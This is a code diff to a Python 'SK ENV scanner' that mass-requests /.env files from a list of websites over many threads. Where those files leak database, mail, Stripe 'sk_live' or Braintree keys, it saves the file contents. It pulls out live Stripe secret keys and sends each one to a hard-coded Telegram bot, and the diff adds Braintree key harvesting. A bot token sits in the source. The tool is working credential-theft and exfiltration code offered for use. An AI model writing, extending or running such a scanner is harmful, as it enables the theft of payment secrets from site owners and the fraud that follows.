@@ -11,8 +11,6 @@ from os import path
 from concurrent.futures import ThreadPoolExecutor
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
-
 Bot_TOKEN = "6499451854:AAG9WRVTVM2ILmjnoLWLN1OQYGbEY4dxskQ"
 USER_ID = "1312277549"
 
@@ -23,69 +21,72 @@ class xcol:
     LBLUE = '\033[38;2;66;165;245m'
     GREY = '\033[38;2;158;158;158m'
 
-class ENV :
-   def scan (self, url):
-      rr = ''
-      proto =''
-      mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=','sk_live', 'APP_ENV=']
-      try:
-         r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
-         if r.status_code ==200:
-            resp = r.text
-            if any(key in resp for key in mch):
-               rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : http://{url}'
-               with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
-                  output.write(f'{resp}\n')
-               if "sk_live" in resp:
-                  file_object = open('SK_ENV.TXT', 'a')
-                  file_object.write(f'ENV : {url}\n')
-                  file_object.close()
-               lin = resp.splitlines( )
-               for x in lin:
-                  if "sk_live" in x:
-                     file_object = open('SK_LIVE.TXT', 'a')
-                     file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
-                     tokyo_sender = (re.sub(".*sk_live","sk_live",x)+'\n')
-                     hit_sender = requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
-                     file_object.close()
-            else :
-               rr = 'RE'
-         else :
-            rr = 'RE'
-      except :
-         rr='RE'
-      if 'RE' in rr :
-         try:
-            proto = 'https'
-            r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
-            if r.status_code ==200:
-               resp = r.text
-               if any(key in resp for key in mch):
-                  rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
-                  with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
-                     output.write(f'{resp}\n')
-                  if "sk_live" in resp:
-                     file_object = open('SK_ENV.TXT', 'a')
-                     file_object.write(f'ENV : {url}\n')
-                     file_object.close()
-                  lin = resp.splitlines( )
-                  for x in lin:
-                     if "sk_live" in x:
-                        file_object = open('SK_LIVE.TXT', 'a')
-                        file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
-                        tokyo_sender = (re.sub(".*sk_live","sk_live",x)+'\n')
-                        hit_sender = requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
-                        file_object.close()
-               else:
-                  rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
+class ENV:
+    def scan(self, url):
+        rr = ''
+        proto = ''
+        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=', 'BRAINTREE_PUBLIC_KEY']
+        try:
+            r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
+            if r.status_code == 200:
+                resp = r.text
+                if any(key in resp for key in mch):
+                    rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : http://{url}'
+                    with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
+                        output.write(f'{resp}\n')
+                    if "sk_live" in resp:
+                        with open('SK_ENV.TXT', 'a') as file_object:
+                            file_object.write(f'ENV : {url}\n')
+                        lin = resp.splitlines()
+                        for x in lin:
+                            if "sk_live" in x:
+                                with open('SK_LIVE.TXT', 'a') as file_object:
+                                    file_object.write(re.sub(".*sk_live", "sk_live", x) + '\n')
+                                tokyo_sender = re.sub(".*sk_live", "sk_live", x) + '\n'
+                                requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
+                    if "BRAINTREE_PUBLIC_KEY" in resp:
+                        with open('Braintree.txt', 'a') as file_object:
+                            file_object.write(f'Braintree : {url}\n')
+                else:
+                    rr = 'RE'
             else:
-               rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
-         except :
-            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
-      print(rr+'/.env')
+                rr = 'RE'
+        except:
+            rr = 'RE'
+        if 'RE' in rr:
+            try:
+                proto = 'https'
+                r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
+                if r.status_code == 200:
+                    resp = r.text
+                    if any(key in resp for key in mch):
+                        rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
+                        with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
+                            output.write(f'{resp}\n')
+                        if "sk_live" in resp:
+                            with open('SK_ENV.TXT', 'a') as file_object:
+                                file_object.write(f'ENV : {url}\n')
+                            lin = resp.splitlines()
+                            for x in lin:
+                                if "sk_live" in x:
+                                    with open('SK_LIVE.TXT', 'a') as file_object:
+                                        file_object.write(re.sub(".*sk_live", "sk_live", x) + '\n')
+                                    tokyo_sender = re.sub(".*sk_live", "sk_live", x) + '\n'
+                                    requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
+                        if "BRAINTREE_PUBLIC_KEY" in resp:
+                            with open('Braintree.txt', 'a') as file_object:
+                                file_object.write(f'Braintree : {url}\n')
+                    else:
+                        rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
+                else:
+                    rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
+            except:
+                rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
+        print(rr + '/.env')
+
 if __name__ == '__main__':
-   os.system('clear')
-   print(""" \033[38;2;158;158;158m
+    os.system('clear')
+    print(""" \033[38;2;158;158;158m
 ███████╗██╗  ██╗    ███████╗███╗   ██╗██╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
 ██╔════╝██║ ██╔╝    ██╔════╝████╗  ██║██║   ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
 ███████╗█████╔╝     █████╗  ██╔██╗ ██║██║   ██║    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
@@ -96,24 +97,24 @@ if __name__ == '__main__':
  
   \u001B[0m""")
 
-   if not os.path.isdir("ENVS"):
-      os.makedirs("ENVS")
-   threads = []
-   while(True):
-      try:
-         thrd = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
-         break
-      except:
-         pass
-   while(True):
-      try:
-         inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
-         with open(inpFile) as urlList:
-            argFile = urlList.read().splitlines()
-         break
-      except:
-         pass
-   with ThreadPoolExecutor(max_workers=thrd) as executor:
-      for data in argFile:
-         threads.append(executor.submit(ENV().scan, data))
-   quit()
+    if not os.path.isdir("ENVS"):
+        os.makedirs("ENVS")
+    threads = []
+    while True:
+        try:
+            thrd = int(input(xcol.GREY + "[THREAD] : " + xcol.RESET))
+            break
+        except:
+            pass
+    while True:
+        try:
+            inpFile = input(xcol.GREY + "[URLS PATH] : " + xcol.RESET)
+            with open(inpFile) as urlList:
+                argFile = urlList.read().splitlines()
+            break
+        except:
+            pass
+    with ThreadPoolExecutor(max_workers=thrd) as executor:
+        for data in argFile:
+            threads.append(executor.submit(ENV().scan, data))
+    quit()
